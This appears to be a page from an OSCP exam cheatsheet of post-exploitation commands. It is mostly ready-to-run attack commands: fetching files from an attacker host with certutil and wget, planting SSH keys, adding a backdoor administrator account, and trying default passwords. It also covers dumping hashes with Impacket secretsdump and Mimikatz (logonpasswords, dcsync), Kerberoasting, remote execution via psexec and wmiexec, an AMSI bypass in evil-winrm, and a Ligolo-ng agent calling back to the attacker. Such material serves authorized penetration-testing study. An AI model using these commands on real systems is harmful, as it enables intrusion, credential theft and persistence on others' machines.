💡 For Finding all important files in Windows (CTF Style)
`cd c:\Users` then `tree /F`
## Important Locations

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#important-locations)

Windows

Linux

**Discovering KDBX files**

1. In Windows

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

2. In Linux

```shell
find / -name *.kdbx 2>/dev/null
```

### GitHub recon

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#github-recon)

- You need to find traces of the `.git` files on the target machine.
- Now navigate to the directory where the file is located, a potential repository.
- Commands

```js
# Log information of the current repository.
git log

# This will display the log of the stuff happened, like commit history which is very useful
git show <commit-id>

# This shows the commit information and the newly added stuff.
```

- If you identify `.git` active on the website. Use [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper) now it downloads all the files and saves it locally. Perform the same above commands and escalate.
- Some useful GitHub dorks: [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets) → this might not be relevant to the exam environment.

## Connecting to RDP

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#connecting-to-rdp)

```shell
xfreerdp /u:uname /p:'pass' /v:IP
xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
```

## Adding SSH Public key

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#adding-ssh-public-key)

- This can be used to get ssh session, on target machine which is based on linux

```js
ssh-keygen -t rsa -b 4096 #give any password

#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 

#On Attacker machine
ssh username@target_ip #enter password if you gave any
```

## File Transfers

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#file-transfers)

- Netcat

```shell
#Attacker
nc <target_ip> 1234 < nmap

#Target
nc -lvp 1234 > nmap
```

- Downloading on Windows

```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

- Downloading on Linux

```powershell
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

### Windows to Kali

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#windows-to-kali)

```powershell
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharename
```

## Adding Users

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#adding-users)

### Windows

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#windows)

```powershell
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

### Linux

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#linux)

```powershell
adduser <uname> #Interactive
useradd <uname>

useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
```

## Password-Hash Cracking

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#password-hash-cracking)

_Hash Analyzer_: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)

### fcrackzip

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#fcrackzip)

```powershell
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
```

### John

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#john)

> [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)

- If there’s an encrypted file, convert it into john hash and crack.

```powershell
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt
```

### Hashcat

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#hashcat)

> [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

```powershell
#Obtain the Hash module number 
hashcat -m <number> hash wordlists.txt --force
```

## Pivoting through SSH

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#pivoting-through-ssh)

```shell
ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"

proxychains4 crackmapexec smb 10.10.10.0/24 #Example
```

## Dealing with Passwords

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#dealing-with-passwords)

- When there’s a scope for bruteforce or hash-cracking then try the following,
    - Have a valid username first
    - Don't forget trying `admin:admin`
    - Try `username:username` as first credential
    - If it’s related to a service, try default passwords.
    - The service name is the username, and the same name is used for the password.
    - Use Rockyou.txt
- Some default passwords to always try out!

```js
password
password1
Password1
Password@123
password@123
admin
administrator
admin@123
```

## Impacket

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#impacket)

```shell
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target

GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list

##RCE
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

atexec.py test.local/john:password123@10.10.10.1 <command>
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

```

## Evil-Winrm

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#evil-winrm)

```shell
##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

## Mimikatz

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#mimikatz)

```powershell
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```

## Ligolo-ng

[](https://github.com/peterrakolcza/OSCP-Cheatsheet#ligolo-ng)

```powershell
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Kali machine - Attacker machine
./proxy -laddr 0.0.0.0:9001 -selfcert

#windows or linux machine - compromised machine
agent.exe -connect <LHOST>:9001 -ignore-cert

#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo
```